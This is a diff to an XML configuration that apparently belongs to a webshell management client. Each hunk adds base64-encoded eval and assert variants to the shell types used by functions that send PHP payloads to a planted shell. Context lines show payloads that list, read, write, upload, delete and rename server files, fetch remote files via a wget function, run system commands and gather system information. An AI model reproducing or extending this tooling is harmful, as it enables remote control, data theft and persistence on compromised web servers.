@@ -3,7 +3,7 @@
   <funcCodeSetting>
     <func>
       <name>WwwRootPathCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/FileManager</path>
       <item><![CDATA[$D=dirname($_SERVER["SCRIPT_FILENAME"]);
 if($D=="") $D=dirname($_SERVER["PATH_TRANSLATED"]);
@@ -19,7 +19,7 @@ print $R;]]></item>
     </func>
     <func>
       <name>FileTreeCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
       <item><![CDATA[$D=base64_decode($_POST["$dirPath$"]);
@@ -46,7 +46,7 @@ else {
     </func>
     <func>
       <name>ReadFileCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
       <item><![CDATA[$F=base64_decode($_POST["$filePath$"]);
@@ -56,7 +56,7 @@ print(@fread($P,filesize($F)));
     </func>
     <func>
       <name>WriteFileCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >fileContext</funcParam>
@@ -66,7 +66,7 @@ print @fwrite(fopen($f,"w"),$buf)?"1":"0";]]></item>
     </func>
     <func>
       <name>DeleteFileOrDirCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
       <item><![CDATA[function df($p)
@@ -94,7 +94,7 @@ print(file_exists($F)?@unlink($F)?"1":"0":"0");
     </func>
     <func>
       <name>DownloadFileCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
       <item><![CDATA[$F=base64_decode($_POST["$filePath$"]);
@@ -111,7 +111,7 @@ else
     </func>
     <func>
       <name>UploadFileCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >savefilePath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >fileHexContext</funcParam>
@@ -125,7 +125,7 @@ print(@fwrite(fopen($f,"w"),$buf)?"1":"0");]]></item>
     </func>
     <func>
       <name>CopyFileOrDirCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >sourceFilePath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >targetFilePath</funcParam>
@@ -165,7 +165,7 @@ print(xcopy($fc,$fp)?"1":"0");]]></item>
     </func>
     <func>
       <name>RenameFileOrDirCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >oldName</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >newName</funcParam>
@@ -175,7 +175,7 @@ print(rename($src,$dst)?"1":"0");]]></item>
     </func>
     <func>
       <name>CreateDirCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
       <item><![CDATA[$f=base64_decode($_POST["$dirPath$"]);
@@ -183,7 +183,7 @@ print(mkdir($f)?"1":"0");]]></item>
     </func>
     <func>
       <name>ModifyFileOrDirTimeCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >aTime</funcParam>
@@ -200,7 +200,7 @@ else
     </func>
     <func>
       <name>WgetCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >urlPath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >saveFilePath</funcParam>
@@ -223,7 +223,7 @@ else
     </func>
     <func>
       <name>ExecuteCommandCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/Cmder</path>
 	  <funcParam location="Body" encrymode="Base64" >cmdPath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >command</funcParam>
@@ -237,7 +237,7 @@ print ($ret!=0)?"ret={$ret}":"";]]></item>
     </func>
     <func>
       <name>SysInfoCode</name>
-	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/Cmder</path>
       <item><![CDATA[$d=dirname($_SERVER["SCRIPT_FILENAME"]);
 $r="{$d}\t";
